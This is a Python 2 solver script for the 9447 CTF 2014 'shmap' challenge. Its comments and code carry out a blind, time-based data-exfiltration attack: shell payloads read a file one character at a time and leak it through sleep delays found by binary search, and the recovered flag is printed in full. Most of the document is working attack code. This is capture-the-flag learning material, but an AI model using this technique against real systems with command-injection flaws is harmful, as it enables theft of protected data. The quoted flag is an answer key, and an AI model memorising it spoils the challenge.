#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# 9447 Security Society CTF 2014 : shmap (Misc 100)
# ---------------------------------------------------------------------------------------
#   What do we have here? We can execute a command but we can't see the results. We
#   tried several stuff like print to stderr, or connection to us or binding a server
#   with no luck. However we get a useful feedback from the instruction: The time used
#   to get executed. Bingo! All we have to do is to execute an instruction, get 1 byte
#   from it, and then make a binary search to identify the value. Let's see the code:
#
#   A=$(echo $(cat flag) | cut -cX-X'); 
#   B=$(printf '%d\n' "'$A");
#   if [[ $B -gt VAL ]]; then sleep 1; else echo foo; fi;
#   if [[ $B -eq VAL ]]; then sleep 4; fi;
#
#   X indicates the current character, and VAL the value which we check each time.
#   If the flag character is greater than VAL we'll have delay of 1 second, and if
#   it's the same we'll have a delay of 4 seconds.
#
#   We don't have to measure the delay. It's on the output.
#   We can execute first an ls, then a wc flag (to get flag length: it's 285).
#
#   The flag is:
#   9447{Im_sick_and_tired_of_the_mess_you_made_me_Never_gonna_catch_me_cry_Oh_whoa_whoa_You_
#   must_be_blind_if_you_cant_see_Youll_miss_me_til_the_day_you_die_Oh_whoa_whoa_Without_me_
#   youre_nothing_Oh_whoa_whoa_You_must_be_blind_if_you_cant_see_Youll_miss_me_til_the_day_
#   you_die_Oh_whoa_whoa}
# ---------------------------------------------------------------------------------------
import socket
import time
import string

# ---------------------------------------------------------------------------------------
if __name__ == '__main__':

    output = ''                                         # store the flag here

    for i in range(1,286):                              # for each character                

        lo = 0
        hi = 128                                        # 7 bit ascii

        while True:
            val = (hi + lo)/2

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect( ('shmap.9447.plumbing',9447) )   # bind with address
            s.settimeout(512);
            resp  = s.recv(512);                        # get command


            packet = 'A=$(echo $(cat flag) | cut -c'+str(i)+'-'+str(i)+'); B=$(printf \'%d\\n\' "\'$A");'
            packet+= 'if [[ $B -gt '+str(val)+' ]]; then sleep 1; else echo foo; fi;'
            packet+= 'if [[ $B -eq '+str(val)+' ]]; then sleep 4; fi'
    
            s.send( packet + '\n' );                    # send packet (don't forget \n)
            resp  = s.recv(512);                        # get response
            s.close()                                   # close connection

            ans = int(resp[5:6])                        # get time fron ans

            if ans == 1  : lo = val + 1
            elif ans == 0: hi = val - 1
            else: print 'Character Found: ', val, chr(val); break

        output = output + chr(val)
        print 'So, far: ',  output
        
    print 'Program finished... ', output
# ---------------------------------------------------------------------------------------

